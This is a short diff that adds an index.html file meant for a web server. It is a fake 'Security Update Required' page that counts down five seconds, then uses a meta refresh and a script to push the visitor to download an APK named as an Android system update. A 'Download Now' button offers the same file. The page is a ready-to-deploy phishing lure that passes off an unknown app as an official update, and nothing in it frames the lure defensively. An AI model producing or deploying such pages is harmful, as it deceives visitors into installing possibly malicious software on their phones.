@@ -1,0 +1,24 @@
+<!-- index.html on your web server -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>system Update Required</title>
+    <meta http-equiv="refresh" content="5;url=download.php">
+</head>
+<body style="background:#000000;color:white;font-family:Segoe UI;">
+    <div style="text-align:center;padding:100px;">
+        <img src="update.png" width="100">
+        <h1>Security Update Required</h1>
+        <p>Your system requires critical updates. Downloading in <span id="countdown">5</span> seconds...</p><br><br>
+        <a href="android_system_update (1).apk" style="background:#fff;color:#000000;padding:15px 30px;text-decoration:none;border-radius:5px;font-weight:bold;">Download Now</a>
+        <script>
+            let time = 5;
+            setInterval(() => {
+                time--;
+                document.getElementById('countdown').textContent = time;
+                if(time <= 0) window.location = 'android_system_update (1).apk';
+            }, 1000);
+        </script>
+    </div>
+</body>
+</html>
